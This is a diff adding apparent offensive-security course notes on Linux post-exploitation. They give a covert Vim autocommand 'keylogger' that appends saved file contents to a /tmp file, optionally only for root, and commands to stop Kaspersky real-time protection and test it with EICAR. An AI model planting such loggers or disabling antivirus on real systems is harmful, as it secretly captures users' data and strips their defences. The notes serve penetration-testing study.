@@ -72,6 +72,53 @@ echo "hacked" > /tmp/hacksrcout.txt
 
 # vim config keylogger
 
+we leverage autocommands 
+:autocmd
+
+`:autocmd BufWritePost * :silent :w! >> /tmp/hackedfromvim.txt`
+
+we can also add it in 
+
+` /home/offsec/.vim/plugin/settings.vim`
+
+we can put an if condition
+
+```
+:if $USER == "root"
+:autocmd BufWritePost * :silent :w! >> /tmp/hackedfromvim.txt
+:endif
+```
+
+### 10.1.2.1 Exercises
+1. Use an autocommand call to write a simple VIM keylogger and silence it as in this section, 
+sourcing it from a separate file than the user’s .vimrc file.
+
+2. Modify the keylogger to only log modified file contents if the user is root
+
+# bypassing AV
+
+linux kaspersky
+
+# Kaspersky Endpoint security
+
+We can turn Kaspersky off using the kesl-control utility. We need to use the --stop-t flag, 
+which stops a specified task number
+
+`sudo kesl-control --stop-t 1`
+
+We can turn Kaspersky off using the kesl-control utility. We need to use the --stop-t flag, 
+which stops a specified task number. The documentation indicates that real-time protection runs 
+as task number 1
+
+`sudo gpg -d eicar.txt.gpg > eicar.txt`
+
+`sudo kesl-control --scan-file ./eicar.txt`
+
+`sudo kesl-control -E --query | grep DetectName`
+
+394
+
+# Shared libraries
 
 
 
